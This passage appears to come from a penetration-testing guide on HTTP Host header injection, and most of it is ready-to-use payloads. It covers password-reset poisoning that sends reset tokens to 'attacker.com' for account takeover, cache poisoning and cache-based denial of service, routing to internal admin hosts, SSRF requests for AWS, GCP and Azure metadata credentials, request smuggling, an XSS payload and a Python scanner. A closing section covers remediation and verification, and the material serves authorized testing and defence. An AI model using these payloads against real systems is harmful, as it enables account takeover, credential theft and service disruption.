**X-Forwarded-Host Poisoning (When Host is sanitized but X-Forwarded-Host is trusted):**
```http
POST /forgot-password HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Double Host Header (Last-wins parser):**
```http
POST /forgot-password HTTP/1.1
Host: example.com
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Absolute URI Poisoning:**
```http
POST http://attacker.com/forgot-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

### 2.3 Token Interception & Account Takeover Chain

1. **Identify the password reset endpoint** (`/forgot-password`, `/reset`, `/api/v1/auth/forgot`)
2. **Submit victim's email address** with poisoned Host header
3. **Monitor attacker-controlled server** (e.g., `attacker.com` access logs) for incoming GET request containing reset token
4. **Extract token** from access log query parameters: `GET /reset-password?token=abc123...`
5. **Submit token** to legitimate reset endpoint to change victim's password
6. **Authenticate** as victim

**Optimized Detection for Password Reset Poisoning:**

| Test | Payload | Success Indicator |
|------|---------|-------------------|
| Direct Host | `Host: attacker.com` | Email link points to `attacker.com` |
| X-Forwarded-Host | `X-Forwarded-Host: attacker.com` | Email link uses `attacker.com` |
| X-HTTP-Host-Override | `X-HTTP-Host-Override: attacker.com` | Email link uses `attacker.com` |
| Port suffix | `Host: example.com:attacker.com` | Parser extracts `attacker.com` |
| Scheme injection | `X-Forwarded-Proto: http` + `X-Forwarded-Host: attacker.com` | Link uses `http://attacker.com` |
| Unicode/IDN | `Host: attacker．com` (fullwidth dot) | Homograph bypass + link generation |

### 2.4 Bypassing Host Validation Filters

If the application validates the Host header against a whitelist:

**Subdomain Injection:**
```http
Host: attacker.com.example.com
```
*(If the application uses `endswith('.example.com')` validation)*

**Null Byte Injection:**
```http
Host: example.com%00.attacker.com
```
*(C-based string termination)*

**Port Injection with URL Parsing Differential:**
```http
Host: example.com:80@attacker.com
Host: example.com?@attacker.com
```
*(If the URL parser used for email generation differs from the Host validator)*

**Header Precedence Bypass:**
```http
Host: example.com
X-Forwarded-Host: attacker.com
```
*(Application validates `Host` but email generator trusts `X-Forwarded-Host`)*

### 2.5 Password Reset Response Analysis

Even if the email is not directly visible, analyze the response for indirect leakage:

- **JSON response** containing the reset URL for "debugging" in dev environments
- **Redirect** to `attacker.com` after submission (`Location: https://attacker.com/reset-sent`)
- **Response body** reflecting the generated URL
- **Error messages** revealing the backend mailer configuration

---

### 3.1 Attack Mechanics

Web Cache Poisoning via Host header occurs when:
1. The **cache** keys the response using one host value (e.g., the original `Host: example.com`)
2. The **origin server** processes a different host value (e.g., `X-Forwarded-Host: attacker.com`) and reflects it in the response body or headers
3. The **poisoned response** is cached and served to other users requesting the same cache key

**Architecture Context:**
- **Varnish:** Default cache key includes `Host` + `URL`; if `X-Forwarded-Host` is processed by backend but not in cache key → poisonable
- **CloudFront:** Can be configured to forward/host-header behavior; if origin reflects `X-Forwarded-Host` in cacheable response → poisonable
- **nginx proxy_cache:** Cache key uses `$host`; if backend uses `$http_x_forwarded_host` → differential
- **Akamai/Fastly:** Highly configurable; check for `Host` vs `X-Forwarded-Host` in cache key rules

### 3.2 Differential Processing Detection

**Step 1: Identify Cacheable Endpoint**
Look for static assets, search results, or API responses with cache headers:
- `Cache-Control: public, max-age=3600`
- `X-Cache: HIT` / `X-Cache: MISS`
- `CF-Cache-Status: HIT` (CloudFlare)
- `Age: 45`

**Step 2: Inject Host Variation**
```http
GET /search?q=test HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```

**Step 3: Check for Reflection**
- Response body contains `attacker.com`
- Response headers (`Location`, `Content-Security-Policy`, `Link`, `Access-Control-Allow-Origin`) contain `attacker.com`

**Step 4: Verify Cache Poisoning**
1. Send poison request with `X-Forwarded-Host: attacker.com`
2. Observe `X-Cache: MISS` (or similar)
3. Send benign request (no injected header) from different session/IP
4. Observe `X-Cache: HIT` and poisoned content in response

### 3.3 Cache Poisoning Payloads by Technology

**Varnish (Default Config):**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*Cache keys on Host; backend reflects X-Forwarded-Host → poisoned*

**CloudFront (Forwarded Host Behavior):**
```http
GET /api/config HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*If origin returns JSON with `{"apiEndpoint": "//attacker.com/api"}` and response is cached*

**nginx (proxy_cache with $host key):**
```http
GET /static/app.js HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*If backend template injects `var BASE_URL = "https://{{.Host}}/";` using X-Forwarded-Host*

### 3.4 Reflected Host in Cacheable Resources

**JavaScript Files:**
```http
GET /config.js HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
Response:
```javascript
var API_BASE = "https://attacker.com/v1";
```
*All users load this poisoned JS, sending API calls to attacker.com*

**JSON Configuration Endpoints:**
```http
GET /api/v1/config HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
Response:
```json
{"base_url": "https://attacker.com", "cdn_url": "https://attacker.com/assets"}
```

**Open Graph / Meta Tags:**
```html
<meta property="og:url" content="https://attacker.com/page">
<link rel="canonical" href="https://attacker.com/page">
```

### 3.5 Denial of Service via Cache Poisoning

Poison the cache to serve error pages or invalid content to all users.

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: invalid..host
```
*If backend throws 500 error and cache caches the 500 response*

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: AAAAAAAAAA...(10000 chars)
```
*If backend reflects Host in headers and exceeds header size limits, causing 502/503*

### 3.6 Cache Key Injection

Some CDNs include specific headers in the cache key. Injecting values into these can create targeted poisoning.

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
Accept-Language: en-US
```
*If cache keys on Accept-Language + Host, poison only affects en-US users*

---

### 4.1 Attack Mechanics

Reverse proxies and web servers route requests to different backend applications based on the `Host` header (virtual host routing). By manipulating the Host header, an attacker may route requests to internal administrative interfaces, development environments, or other tenants' applications that are not exposed via public DNS or external IP binding.

**Common Routing Configurations:**

**nginx:**
```nginx
server {
    listen 80;
    server_name admin.internal.local;
    location / { proxy_pass http://127.0.0.1:8080; }
}
server {
    listen 80;
    server_name example.com;
    location / { proxy_pass http://backend:3000; }
}
```

**Apache:**
```apache
<VirtualHost *:80>
    ServerName admin.internal.local
    DocumentRoot /var/www/admin
</VirtualHost>
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/public
</VirtualHost>
```

### 4.2 Internal Admin Interface Access

**Direct Host Spoofing:**
```http
GET / HTTP/1.1
Host: admin.internal.local
```

**Common Internal Hostnames to Test:**
```
admin.localhost
admin.internal
admin.internal.local
localhost
127.0.0.1
0.0.0.0
[::1]
internal.example.com
dev.example.com
staging.example.com
api-internal.example.com
grafana.internal
kibana.internal
jenkins.internal
kubernetes.default.svc.cluster.local
```

**With X-Forwarded-Host (if reverse proxy uses this for routing):**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: admin.internal.local
```

### 4.3 Access Control Bypass

Many applications restrict access to `/admin` based on the Host header or source IP. If the Host header routes to an internal interface that lacks IP restrictions:

```http
GET /admin/dashboard HTTP/1.1
Host: admin.internal.local
```
*Bypasses external IP whitelist because the request is routed internally*

### 4.4 Cloud Metadata & Internal Service Routing

In cloud environments, the Host header may be used to route to internal metadata endpoints or sidecar containers.

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```
*(If the reverse proxy routes based on Host and forwards the request to the metadata service)*

### 4.5 Kubernetes / Container Environment Misrouting

```http
GET / HTTP/1.1
Host: kubernetes.default.svc.cluster.local
```

```http
GET / HTTP/1.1
Host: backend-service.namespace.svc.cluster.local
```

**Service Discovery Enumeration:**
```
service-name.default.svc.cluster.local
service-name.namespace.svc.cluster.local
service-name.namespace.svc
service-name
backend
api
db
redis
```

---

### 5.1 Attack Mechanics

When the application uses the `Host` header to construct outgoing requests (webhooks, API calls, resource fetching, health checks), manipulating the Host header can force the server to send requests to arbitrary internal or external targets.

**Vulnerable Code Pattern (Pseudo):**
```python
host = request.headers.get('Host')
response = requests.get(f"http://{host}/internal/api/status")
```

### 5.2 Cloud Metadata API Access

**AWS EC2 Instance Metadata Service (IMDSv1 & IMDSv2):**
```http
GET / HTTP/1.1
Host: 169.254.169.254
```

**Direct Metadata Path Access:**
```http
GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
```

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```

```http
GET /latest/meta-data/iam/security-credentials/ROLE_NAME HTTP/1.1
Host: 169.254.169.254
```

**IMDSv2 Session Token Retrieval (if PUT is allowed via Host-derived request):**
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

**GCP Metadata:**
```http
GET /computeMetadata/v1/ HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

**Azure Metadata:**
```http
GET /metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

### 5.3 Internal Service Enumeration & Access

```http
GET / HTTP/1.1
Host: 127.0.0.1
```

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
```

```http
GET / HTTP/1.1
Host: 192.168.1.1
```

```http
GET / HTTP/1.1
Host: 10.0.0.1
```

**Common Internal Targets:**
```
localhost:22          (SSH banner grabbing)
localhost:3306        (MySQL)
localhost:5432        (PostgreSQL)
localhost:6379        (Redis)
localhost:9200        (Elasticsearch)
localhost:27017       (MongoDB)
localhost:8080        (Alternative web admin)
localhost:8443        (HTTPS admin)
localhost:3000        (Grafana, Dev apps)
localhost:5000        (Docker registry, Flask)
localhost:9000        (MinIO, SonarQube)
localhost:2375        (Docker daemon)
```

### 5.4 SSRF via Header Combinations

Some applications construct URLs using multiple headers:

```http
GET /api/fetch HTTP/1.1
Host: example.com
X-Forwarded-Host: 169.254.169.254
X-Forwarded-Port: 80
X-Forwarded-Proto: http
```

**Absolute URL Construction:**
```http
GET / HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Proto: http
```
*Backend constructs: `http://169.254.169.254/latest/meta-data/`*

### 5.5 SSRF to Internal APIs with Authentication Bypass

If the backend application makes authenticated requests to internal APIs using the Host header:

```http
GET /internal/api/users HTTP/1.1
Host: 127.0.0.1:8080
```
*May bypass external-facing authentication if internal API trusts localhost*

---

### 6.1 X-Forwarded-Host

The most common alternative header used by reverse proxies. Many frameworks trust this header for generating URLs when behind a load balancer.

**Detection:**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```

**Precedence Testing:**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 8080
X-Forwarded-Proto: https
X-Forwarded-Server: attacker.com
```

### 6.2 X-HTTP-Host-Override

Used by some PHP frameworks and legacy proxies.

```http
GET / HTTP/1.1
Host: example.com
X-HTTP-Host-Override: attacker.com
```

### 6.3 Forwarded (RFC 7239)

Standardized forwarding header. Complex parsing can lead to injection.

```http
GET / HTTP/1.1
Host: example.com
Forwarded: for=192.168.1.1;host=attacker.com;proto=https
```

```http
GET / HTTP/1.1
Host: example.com
Forwarded: host=attacker.com
```

**Parser Differential:** Some implementations parse the first `host=` token; others parse the last.

### 6.4 HTTP/2 `:authority` Pseudo-Header

In HTTP/2, the `:authority` pseudo-header replaces the `Host` header. During HTTP/2 downgrade to HTTP/1.1, translation issues can occur.

**HTTP/2 Direct Injection:**
```http
:method: GET
:path: /
:scheme: https
:authority: attacker.com
```

**HTTP/2 to HTTP/1.1 Desync:**
```http

# HTTP/2 frontend translates to:
GET / HTTP/1.1
Host: attacker.com
```
*If the backend also processes `X-Forwarded-Host`, dual injection is possible*

**HTTP/2 with Conflicting Headers:**
```http
:authority: example.com
Host: attacker.com
```
*Some translators use `:authority`; others use `Host` → routing differential*

### 6.5 Additional Proxy Headers

```http
X-Host: attacker.com
X-Original-Host: attacker.com
X-Rewrite-URL: http://attacker.com/
X-Original-URL: http://attacker.com/
X-Forwarded-Server: attacker.com
X-Forwarded-Scheme: https
X-Scheme: https
Front-End-Https: on
X-ProxyUser-Ip: 127.0.0.1
```

### 6.6 Host Header Concatenation Attacks

Some servers concatenate multiple Host header values:

```http
Host: example.com
Host: attacker.com
```

Result: `Host: example.com, attacker.com` or `example.comattacker.com`

If the URL parser extracts the second host from a comma-separated list:
```http
Host: example.com, attacker.com
```

### 6.7 Port Injection & URL Parser Differentials

```http
Host: example.com:443@attacker.com
Host: example.com?@attacker.com
Host: example.com\attacker.com
Host: example.com.attacker.com
```

**If the application uses a URL parser to extract the host:**
- Python `urllib.parse.urlparse()` vs `request.headers.get('Host')` may yield different results
- Node.js `url.parse()` vs `req.headers.host`
- Java `URI` class vs raw header string

---

### 7.1 Host Header + HTTP Request Smuggling

Combine Host header injection with request smuggling to route smuggled requests to internal hosts or poison caches with internal responses.

**CL.TE Desync with Host Injection:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: admin.internal.local
Foo: bar
```

**TE.CL Desync:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5b
GET /admin HTTP/1.1
Host: admin.internal.local
Content-Length: 15

x=1
0

```

### 7.2 Host Header + Open Redirect Chain

If the application reflects the Host header in a redirect, chain it with an open redirect on the attacker domain to steal tokens or phish users.

```http
GET /login?redirect=/dashboard HTTP/1.1
Host: attacker.com
```
Response:
```http
HTTP/1.1 302 Found
Location: https://attacker.com/login?redirect=/dashboard
```
*Attacker's server logs the full URL including any sensitive query parameters*

### 7.3 Host Header + Reflected XSS

If the Host header is reflected unsanitized in HTML, achieve XSS without needing a separate vector.

```http
GET / HTTP/1.1
Host: attacker.com"><script>alert(1)</script>
```

**Reflected contexts:**
- `<base href="https://attacker.com"><script>alert(1)</script>/">`
- `<link rel="canonical" href="https://attacker.com"><script>alert(1)</script>">`
- JavaScript: `var host = "attacker.com";alert(1);//";`

### 7.4 Host Header + DNS Rebinding

Force the application to cache a poisoned Host value, then change DNS to point to an internal IP.

1. Set Host to `attacker-controlled.com` (points to attacker server initially)
2. Application caches/configures based on this host
3. Change DNS A record for `attacker-controlled.com` to `169.254.169.254`
4. Application's subsequent requests hit the metadata service

### 7.5 Host Header in API Gateways & Microservices

In microservice architectures, the Host header may determine which upstream service receives the request.

**Kubernetes Ingress Host-based Routing:**
```http
GET /api/users HTTP/1.1
Host: api-internal.default.svc.cluster.local
```
*Bypasses external API gateway and hits internal service directly*

**AWS API Gateway Custom Domain Names:**
```http
GET /prod/api HTTP/1.1
Host: internal-api.execute-api.us-east-1.amazonaws.com
```
*Access to unintended API stages*

### 7.6 Host Header in OAuth / SAML Flows

Poison OAuth callback URLs or SAML AssertionConsumerService URLs via Host header injection.

```http
GET /oauth/authorize?client_id=xxx&redirect_uri=/callback HTTP/1.1
Host: attacker.com
```
*Authorization code delivered to `attacker.com/callback?code=...`*

---

### 8.1 Manual Testing Workflow

For each endpoint and parameter:

1. **Baseline request** — Capture normal request/response
2. **Host replacement** — `Host: attacker.com` → Check reflection in body/headers
3. **Header variation sweep** — Test all 15+ alternative headers individually
4. **Double Host test** — Duplicate Host headers with conflicting values
5. **Absolute URI test** — `GET http://attacker.com/ HTTP/1.1`
6. **HTTP/2 :authority test** — If HTTP/2 is supported
7. **Password reset test** — Submit reset with poisoned Host, check email/links
8. **Cache test** — Check for cache poisoning differential (cache key vs origin processing)
9. **Internal routing test** — Brute-force internal hostnames (`admin.localhost`, `127.0.0.1`, etc.)
10. **SSRF test** — `Host: 169.254.169.254`, `Host: metadata.google.internal`
11. **WAF/filter bypass** — Encoding, case variation, port injection, null bytes
12. **Chain identification** — Request smuggling, open redirect, XSS, OAuth

### 8.2 Automation Script Logic (Python Pseudocode)

```python
import requests

HOST_VARIANTS = [
    "Host",
    "X-Forwarded-Host",
    "X-HTTP-Host-Override",
    "X-Host",
    "X-Original-Host",
    "Forwarded",
    "X-Forwarded-Server",
    ":authority"
]

INTERNAL_HOSTS = [
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "[::1]",
    "admin.internal.local",
    "169.254.169.254",
    "metadata.google.internal",
    "kubernetes.default.svc.cluster.local"
]

def test_host_injection(url, param_value="attacker.com"):
    for header in HOST_VARIANTS:
        headers = {"Host": "example.com"}
        if header == ":authority":
            # HTTP/2 specific handling required
            continue
        headers[header] = param_value
        resp = requests.get(url, headers=headers, allow_redirects=False)
        
        if param_value in resp.text:
            print(f"[REFLECTION] {header}: {param_value} reflected in response body")
        if param_value in resp.headers.get("Location", ""):
            print(f"[REDIRECT] {header}: {param_value} in Location header")
        if "Cache-Control" in resp.headers and "public" in resp.headers["Cache-Control"]:
            print(f"[CACHEABLE] {header}: Response is cacheable - check for cache poisoning")

def test_internal_routing(url):
    for internal in INTERNAL_HOSTS:
        headers = {"Host": internal}
        resp = requests.get(url, headers=headers, allow_redirects=False)
        if resp.status_code == 200 and "example.com" not in resp.text:
            print(f"[VHOST] Host: {internal} returned unique content ({len(resp.text)} bytes)")
```

### 8.3 Recommended Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| **Burp Suite** | Proxy, Repeater, Intruder, Collaborator | Essential; use Collaborator for blind token interception |
| **Burp BApp: Param Miner** | Host header variation detection | Automatically guesses headers and parameters |
| **Burp BApp: HTTP Request Smuggler** | CL.TE/TE.CL detection | For Host + smuggling chains |
| **ffuf** | Virtual host discovery | `ffuf -H "Host: FUZZ.example.com" -w vhosts.txt` |
| **gobuster vhost** | DNS + VHost brute-forcing | `gobuster vhost -u http://example.com -w wordlist.txt` |
| **curl** | Quick header manipulation | `curl -H "Host: attacker.com" http://example.com` |
| **Nuclei** | Automated template scanning | Use `host-header-injection` templates |
| **Interactsh / Burp Collaborator** | Out-of-band detection | For blind token/email interception |
| **Postman** | API endpoint testing | For SOAP/REST API Host header testing |

---

### 9.1 Secure Configuration Patterns

**nginx (Use `$host` or `$server_name`, not user-supplied):**
```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    
    # Reject requests with incorrect Host
    if ($host !~* ^(example.com|www.example.com)$ ) {
        return 444;
    }
    
    # Do not trust X-Forwarded-Host for URL generation
    proxy_set_header Host $host;
}
```

**Apache (Disable UseCanonicalName, validate Host):**
```apache
UseCanonicalName Off
ServerName example.com

<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    
    # Reject unknown Hosts
    <If "%{HTTP_HOST} !~ /^example\.com$/ && %{HTTP_HOST} !~ /^www\.example\.com$/">
        Require all denied
    </If>
</VirtualHost>
```

**Application-Level (URL Generation):**
```python

# NEVER use request headers for URL base
BASE_URL = "https://example.com"  # Hardcoded or config-driven

# If behind a trusted proxy, whitelist allowed proxy headers
TRUSTED_HOSTS = ["example.com", "www.example.com"]
if request.headers.get('X-Forwarded-Host') not in TRUSTED_HOSTS:
    x_forwarded_host = None
```

**Password Reset (Hardcoded Domain):**
```python
reset_url = f"https://example.com/reset-password?token={token}"

### 9.2 Cache Layer Remediation

- **Include all host-derived headers in cache key** or strip them at the cache layer
- **Varnish:** Ensure `X-Forwarded-Host` is not processed by backend for cacheable content, or include it in `hash_data()`
- **CloudFront:** Configure cache policies to not forward `X-Forwarded-Host` unless explicitly required
- **nginx:** Use `proxy_cache_key "$scheme$request_method$host$request_uri";` (use `$host`, not `$http_x_forwarded_host`)

### 9.3 Reverse Proxy Remediation

- **Validate Host header** against a strict whitelist at the edge (load balancer, WAF, ingress controller)
- **Drop unknown Host headers** with 444 (nginx) or 403
- **Do not route based on untrusted headers** (`X-Forwarded-Host` should never override routing decisions unless from a trusted proxy)
- **Use `$server_name`** for internal routing, not `$http_host`

### 9.4 Verification Steps for Fix Validation

1. **Resubmit all attack payloads** — Confirm no reflection, no routing changes, no email poisoning
2. **Test password reset** — Verify reset links always use hardcoded/whitelisted domain
3. **Test cache poisoning** — Confirm cache key and origin processing use the same host source
4. **Test virtual host routing** — Confirm `Host: admin.internal.local` returns 403/444, not admin content
5. **Test SSRF** — Confirm `Host: 169.254.169.254` is rejected or does not trigger internal requests
6. **Test header variations** — Verify `X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded` are ignored or sanitized
7. **Test HTTP/2** — Verify `:authority` is validated identically to `Host`
8. **Test double headers** — Confirm duplicate Host headers are rejected (RFC 7230 violation)
9. **Test absolute URI** — Confirm absolute URI in request line does not bypass Host validation
10. **Verify error handling** — Generic errors only, no internal hostname leakage

### 9.5 Defense-in-Depth

- **Web Application Firewall:** Deploy rules to block `Host` values containing internal IPs, metadata addresses, or unexpected domains
- **Network Segmentation:** Internal admin interfaces should not be routable from the reverse proxy layer
- **Cloud Metadata Protection:** Implement IMDSv2 (session-based) on AWS; require `Metadata-Flavor: Google` on GCP; use Azure IMDS with `Metadata: true` and network controls
- **Monitoring:** Alert on requests with `Host` values matching `169.254.169.254`, `localhost`, or internal DNS patterns
- **HSTS & Secure Cookies:** Mitigate impact of successful Host header injection by preventing protocol downgrade and cookie theft

---

## Quick Reference: Optimized Payload Matrix

| Objective | Payload | Context |
|-----------|---------|---------|
| **Detect Reflection** | `Host: attacker.com` | Any request |
| **X-Forwarded-Host** | `X-Forwarded-Host: attacker.com` | Behind proxies/CDN |
| **Forwarded RFC 7239** | `Forwarded: host=attacker.com` | Modern proxy stacks |
| **HTTP/2 Authority** | `:authority: attacker.com` | HTTP/2 endpoints |
| **Double Host** | `Host: example.com` + `Host: attacker.com` | Parser differential |
| **Absolute URI** | `GET http://attacker.com/ HTTP/1.1` | Proxy desync |
| **Password Reset Poison** | `Host: attacker.com` on `/forgot-password` | Email link theft |
| **Cache Poison** | `X-Forwarded-Host: attacker.com` on cacheable resource | Differential processing |
| **VHost Misroute** | `Host: admin.internal.local` | Internal admin access |
| **AWS SSRF** | `Host: 169.254.169.254` | Metadata extraction |
| **GCP SSRF** | `Host: metadata.google.internal` | GCP token theft |
| **Azure SSRF** | `Host: 169.254.169.254` + `Metadata: true` | Azure metadata |
| **Port Injection** | `Host: example.com:80@attacker.com` | Parser bypass |
| **Null Byte** | `Host: example.com%00.attacker.com` | C-string termination |
| **Subdomain Bypass** | `Host: attacker.com.example.com` | Suffix validation bypass |
| **Request Smuggling** | `Host: example.com` + smuggled `Host: internal.local` | Internal request routing |

---

## Testing Notes

- **Always test with Burp Collaborator or Interactsh** for out-of-band confirmation when testing password reset poisoning or blind SSRF.
- **Test cache poisoning during off-peak hours** and immediately purge the cache after verification to avoid impacting legitimate users.
- **Enumerate internal hostnames aggressively** in Kubernetes/cloud environments; service discovery names often follow predictable patterns.
- **Document the header precedence chain** for the target application (which header wins: Host vs X-Forwarded-Host vs Forwarded).
- **Check HTTP/2 endpoints separately**; many tools downgrade to HTTP/1.1 and miss `:authority` pseudo-header vulnerabilities.
- **When testing SSRF, attempt both the Host header and X-Forwarded-Host**; some applications construct internal requests using different header sources.
- **Be aware of CDN-specific behaviors** (CloudFront cache key policies, Akamai edge logic, Fastly VCL) as they dramatically affect cache poisoning viability.
- **Combine with open redirect testing** — a poisoned Host header that generates `Location: https://attacker.com/...` can steal OAuth codes and session tokens.
